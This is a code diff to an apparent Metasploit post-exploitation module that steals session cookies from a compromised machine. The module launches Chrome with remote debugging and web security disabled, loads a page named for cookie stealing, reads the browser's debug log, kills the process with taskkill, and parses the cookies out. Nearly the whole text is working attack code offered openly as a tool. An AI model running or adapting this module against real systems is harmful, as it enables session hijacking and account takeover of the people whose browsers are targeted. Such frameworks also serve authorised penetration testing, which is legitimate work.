@@ -68,10 +68,19 @@ class MetasploitModule < Msf::Post
     @html_storage_path = create_cookie_stealing_html
 
     @chrome_debugging_cmd = "#{@chrome}"
-    @chrome_debugging_args = @platform == :windows ? '--enable-logging --disable-gpu' : '--headless'
-    @chrome_debugging_args << " --disable-web-security --disable-plugins --user-data-dir=\"#{@user_data_dir}\" --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']} #{@html_storage_path}"
+    if @platform == :windows
+      @chrome_debugging_args = '--enable-logging'
+      @chrome_debugging_args << ' --disable-gpu'
+      @chrome_debugging_args << ' --window-position=0,0'
+    else
+      @chrome_debugging_args = '--headless'
+    end
 
-    nil
+    @chrome_debugging_args << ' --disable-web-security'
+    @chrome_debugging_args << ' --disable-plugins'
+    @chrome_debugging_args << " --user-data-dir=\"#{@user_data_dir}\""
+    @chrome_debugging_args << " --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']}"
+    @chrome_debugging_args << " #{@html_storage_path}"
   end
 
   def create_cookie_stealing_html
@@ -127,14 +136,16 @@ class MetasploitModule < Msf::Post
 
   def get_cookies
     if @platform == :windows
-      chrome_output_pid = cmd_exec_get_pid @chrome_debugging_cmd, @chrome_debugging_args
+      chrome_pid = cmd_exec_get_pid @chrome_debugging_cmd, @chrome_debugging_args
       Rex::sleep(5)
+
       chrome_output = read_file("#{@user_data_dir}\\chrome_debug.log")
+      cmd_exec("taskkill /f /pid #{chrome_pid}")
     else
-      chrome_output = cmd_exec @chrome_debugging_cmd, @chrome_debugging_args, 2
+      chrome_output = cmd_exec @chrome_debugging_cmd, @chrome_debugging_args
     end
 
-    print_status "Activated Chrome's Remote Debugging via #{@chrome_debugging_cmd}"
+    print_status "Activated Chrome's Remote Debugging via #{@chrome_debugging_cmd} #{@chrome_debugging_args}"
 
     # Parse out the cookies from Chrome's output
     cookies_pattern = /REMOTE_DEBUGGING|\[.*\]/m
